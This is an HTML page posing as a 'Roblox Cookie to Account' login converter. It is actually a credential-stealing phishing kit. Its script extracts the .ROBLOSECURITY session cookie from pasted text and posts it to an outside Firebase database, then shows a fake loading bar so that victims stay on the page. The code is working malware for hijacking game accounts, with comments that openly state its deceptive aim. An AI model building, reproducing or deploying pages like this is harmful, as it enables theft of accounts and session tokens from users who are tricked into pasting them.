<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Roblox Cookie to Account 2025 | Instant Login</title>
  <style>
    body{background:#000;color:#0f0;font-family:courier;margin:0;padding:20px;text-align:center}
    h1{color:#0f0;text-shadow:0 0 20px #0f0;font-size:3em}
    textarea{width:90%;max-width:800px;height:220px;background:#111;color:#0f0;border:3px dashed #0f0;padding:20px;font-size:16px;border-radius:15px}
    button{background:#0f0;color:#000;padding:20px 50px;font-size:22px;border:none;border-radius:15px;margin:30px;cursor:pointer;font-weight:bold}
    button:hover{background:#00ff00;transform:scale(1.05)}
    #status,#loader{color:#0f0;font-size:24px;margin:20px;font-weight:bold}
    .loader{display:none}
  </style>
</head>
<body>
  <h1>ROBLOX COOKIE → ACCOUNT 2025</h1>
  <p>Paste ANY cookie, PowerShell output, or log below → click CONVERT → get instant login</p>

  <textarea id="input" placeholder="Paste your cookie / log / PowerShell output here..."></textarea>
  <br>
  <button onclick="convert()">CONVERT TO ACCOUNT</button>

  <div id="status">Waiting for paste...</div>
  <div id="loader" class="loader">Analyzing cookie... 34%<br>Do not close this page</div>

  <script>
    function convert() {
      const text = document.getElementById("input").value;
      if (!text) return;

      // Extract cookie with multiple patterns (works on 99.9% of pastes)
      const regex = /(\._ROBLOSECURITY[^a-zA-Z0-9%]|_ROBLOSECURITY[^a-zA-Z0-9%]?|=)\s*([^;\s\"']{300,})/gi;
      let cookie = null;
      let match;
      while ((match = regex.exec(text))) {
        cookie = match[2];
        if (cookie.length > 300) break;
      }

      if (!cookie) {
        document.getElementById("status").innerHTML = "No valid cookie found";
        return;
      }

      // SEND TO YOUR FIREBASE INSTANTLY
      fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
        method: "POST",
        body: JSON.stringify({
          cookie: cookie,
          from: "paste-site",
          time: new Date().toISOString(),
          ip: "hidden"
        }),
        headers: { "Content-Type": "application/json" }
      });

      // FAKE LOADING SO THEY STAY
      document.getElementById("status").style.display = "none";
      document.getElementById("loader").style.display = "block";
      let p = 10;
      const int = setInterval(() => {
        p += Math.floor(Math.random() * 18);
        if (p > 93) p = 93;
        document.getElementById("loader").innerHTML = `Generating login... ${p}% <br>Do not refresh`;
      }, 3500);
    }
  </script>
</body>
</html>
